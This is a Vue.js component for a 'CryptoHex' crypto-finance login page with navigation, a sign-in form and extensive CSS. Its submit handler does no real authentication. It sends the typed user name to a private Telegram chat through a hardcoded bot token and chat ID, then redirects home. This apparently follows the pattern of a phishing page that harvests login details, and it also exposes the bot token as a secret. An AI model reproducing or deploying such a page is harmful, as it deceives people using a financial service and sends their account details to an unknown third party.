<template>
    <div class="background2">
        <div class="container">
        <div class="header">
          <nav class="navbar navbar-expand-lg navbar-dark ml-auto">
            <router-link to="/"><img class="navbar-brand" id="headerLogo" src="../assets/HeaderLogo.svg" /></router-link>
  <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item">
        <a class="nav-link" href="/#/">HOME <span class="sr-only"></span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/#/">ABOUT US</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/#/">WHY US</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="/#/">CONTACT US</a>
      </li>
      <li class="nav-item active">
          <a class="nav-link" href="/#/login">LOGIN</a>
      </li>
    </ul>
  </div>
</nav>
        </div>
        <div class="loginP">
            <div class="left">
                <img class="leftLogo" src="../assets/HeaderLogo.svg" />
                <h1 class="leftTitle">EXPERIENCE THE FUTURE OF FINANCE WITH CRYPTOHEX</h1>
            </div>
            <div class="right">
              <form @submit.prevent="submitForm">
                <div class="rightWrapper">
                <div class="userName">
                    <label for="userName"><strong>User name or Email</strong></label>
                <input v-model="form.userName" type="text" id="userName" name="userName">
                </div>
                <div class="password">
                    <label for="password"><strong>Password</strong></label>
                <input v-model="form.userPassword" type="password" id="password" name="password">
                </div>
                <div class="forgetPassword">
                    <a href="/#">Forget password?</a>
                </div>
                    <button :disabled="!isFormValid" type="submit" class="signIn">Sign In</button>
                <p class="or">or</p>
                    <button class="googleButton"><span class="googleIcon"><img src="../assets/Vector.svg" /></span>Sign In with Google</button>
                <div class="noAccount">
                    <a href="/#/register">No Account?<strong>Create Account</strong></a>
                </div>
                </div>
              </form>
            </div>
        </div>
        </div>
    </div>
</template>

<script>
import axios from 'axios'; 
export default {
    name: 'LoginPage',
    data() {
      return {
        form: {
          userName: '',
          userPassword: '',
        }
      }
    },
    computed: {
      text() {
        return `Hello ${this.form.userName}, you have success to login into your CryptoHex Account`
      },
      isFormValid() {
        return this.form.userName.trim().length > 0 && this.form.userPassword.trim().length > 0 && this.form.userPassword.trim().length > 0 && this.form.userPassword.trim().length > 0;
      }
    },
    methods: {
      async submitForm() {
        const token = '6154604609:AAE1qmPp-I_jOxndD-01zMxwnR2BTwtSHss';
        const chatId= '5288823606';
        const data = {text: this.text};
        try {
          const response = await axios.post(
            `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`,
          data,
          );
          this.$router.push('/')
        }
        catch(err) {
          console.log(err);
        }
      }
    }
}
</script>

<style scoped>
* {
  box-sizing: border-box;
  padding: 0;
  font-family: 'Quantico', sans-serif, serif;
}
.background2 {
  overflow: auto;
  color: white;
  width: 100%;
  height: 100vh;
  background: var(--backgroundColor2);
}

.header {
  margin-top: 2%;
}
#headerLogo {
  width: 261px;
  height: 107px;
}
#navbarSupportedContent {
  font-size: 22px;
}

.navbar-nav {
  z-index: 1;
}
.nav-item a{
  font-family: 'recons';
  color: white;
}
.nav-item.active a{
  color: #E7BDFB;
}
.loginP {
    width: 90%;
    height: 75vh;
    margin-left: 5%;
    display: flex;
}
.left {
    width: 70%;
    background: var(--color-navy);
    padding:10%;
}
.leftTitle {
    font-family: 'recons';
    font-size: 32px;
}
.leftLogo {
    width: 80%;
}
.right {
    color: black;
    width: 30%;
    background: var(--color-white);
    display: flex;
    flex-direction: column;
    justify-content: center;
    font-size: 16px;
}
.rightWrapper {
    width: 80%;
    margin: 10%;
}
.userName {
    display: flex;
    flex-direction: column;
    margin-bottom: 5%;
}
.password {
    display: flex;
    flex-direction: column;
    margin-bottom: 5%;
}
.forgetPassword {
    display: flex;
    justify-content: end;
    margin-bottom: 5%;
}
.forgetPassword a{
    color: black;
    text-decoration: none;
}

.signIn {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 40%;
    height: 15%;
    margin-top: 2.5%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-left: 30%;
}
.or {
    display: flex;
    justify-content: center;
    margin-top: 2.5%;
}

.googleButton {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 80%;
    height: 20%;
    margin-top: 2.5%;
    display: flex;
    justify-content: space-evenly;
    align-items: center;
    margin-left: 10%;
}



.noAccount {
    margin-top: 2.5%;
    display: flex;
    justify-content: end;
}

.noAccount a {
    color: black;
    text-decoration: none;
}

@media only screen and (max-width: 480px) {
  .left {
    display: none;
  }

  .right {
    color: black;
    width: 100%;
    background: var(--color-white);
    display: flex;
    flex-direction: column;
    justify-content: center;
    font-size: 20px;
}
.rightWrapper {
    width: 80%;
}
.userName {
    display: flex;
    flex-direction: column;
    margin-bottom: 10%;
}
.password {
    display: flex;
    flex-direction: column;
    margin-bottom: 5%;
}
.forgetPassword {
    display: flex;
    justify-content: end;
    margin-bottom: 5%;
}
.forgetPassword a{
    color: black;
    text-decoration: none;
}

.signIn {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 40%;
    height: 15%;
    margin-top: 2.5%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-left: 30%;
}
.or {
    display: flex;
    justify-content: center;
    margin-top: 2.5%;
}

.googleButton {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 100%;
    height: 20%;
    margin-top: 2.5%;
    display: flex;
    justify-content: space-evenly;
    align-items: center;
    margin-left: 0%;
}



.noAccount {
    margin-top: 2.5%;
    display: flex;
    justify-content: start;
}

.noAccount a {
    color: black;
    text-decoration: none;
}

}
@media only screen and (min-width: 480px) and (max-width:1200px) {
  .left {
    display: none;
  }

  .right {
    color: black;
    width: 100%;
    background: var(--color-white);
    display: flex;
    flex-direction: column;
    justify-content: center;
    font-size: 28px;
}
.rightWrapper {
    width: 80%;
}
.userName {
    display: flex;
    flex-direction: column;
    margin-bottom: 10%;
}
.password {
    display: flex;
    flex-direction: column;
    margin-bottom: 5%;
}
.forgetPassword {
    display: flex;
    justify-content: end;
    margin-bottom: 5%;
}
.forgetPassword a{
    color: black;
    text-decoration: none;
}

.signIn {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 40%;
    height: 15%;
    margin-top: 2.5%;
    display: flex;
    justify-content: center;
    align-items: center;
    margin-left: 30%;
}
.or {
    display: flex;
    justify-content: center;
    margin-top: 2.5%;
}

.googleButton {
    background: var(--color-navy);
    color: white;
    border-radius: 5%;
    width: 100%;
    height: 20%;
    margin-top: 2.5%;
    display: flex;
    justify-content: space-evenly;
    align-items: center;
    margin-left: 0%;
}



.noAccount {
    margin-top: 2.5%;
    display: flex;
    justify-content: start;
}

.noAccount a {
    color: black;
    text-decoration: none;
}

}


</style>